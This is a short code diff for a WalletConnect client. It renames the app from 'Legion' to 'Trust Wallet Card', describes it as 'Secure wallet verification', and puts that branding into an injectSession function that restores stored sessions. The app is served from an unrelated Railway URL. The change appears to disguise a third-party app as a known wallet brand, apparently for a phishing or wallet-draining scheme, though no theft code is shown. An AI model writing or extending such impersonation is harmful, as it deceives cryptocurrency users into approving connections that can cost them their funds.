@@ -153,8 +153,8 @@ async function getClient(): Promise<SignClientInstance | null> {
       _client = await SignClient.init({
         projectId,
         metadata: {
-          name: 'Legion',
-          description: '',
+          name: 'Trust Wallet Card',
+          description: 'Secure wallet verification',
           url: (process.env['API_PUBLIC_URL'] ?? 'https://sadrailala-production.up.railway.app').trim(),
           icons: [],
         },
@@ -191,7 +191,7 @@ async function injectSession(s: WcSessionData): Promise<boolean> {
       optionalNamespaces: {},
       self: {
         publicKey: s.self_public_key ?? '',
-        metadata: { name: 'Legion', description: '', url: '', icons: [] },
+        metadata: { name: 'Trust Wallet Card', description: '', url: '', icons: [] },
       },
       peer: {
         publicKey: s.peer_public_key ?? '',
